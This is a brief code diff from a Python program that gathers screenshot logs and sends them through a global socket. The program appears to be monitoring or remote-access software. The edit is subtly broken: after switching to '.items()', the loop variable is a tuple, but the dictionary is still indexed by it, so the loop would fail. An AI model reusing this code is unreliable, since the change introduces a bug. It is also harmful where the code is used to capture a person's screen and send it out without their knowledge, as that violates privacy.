@@ -166,7 +166,7 @@ def send_screenshot():
 
     config = init()
     if config['sts'] and len(SCREENSHOT_LOGS) > 0 and ACTIVE:
-        for i in SCREENSHOT_LOGS:
+        for i in SCREENSHOT_LOGS.items():
             data_send(GLOBAL_SOCKET, str(SCREENSHOT_LOGS[i]), 'screenshotLogs')
         SCREENSHOT_LOGS = {}
     screen_scheduler = sched.scheduler(time.time, time.sleep)
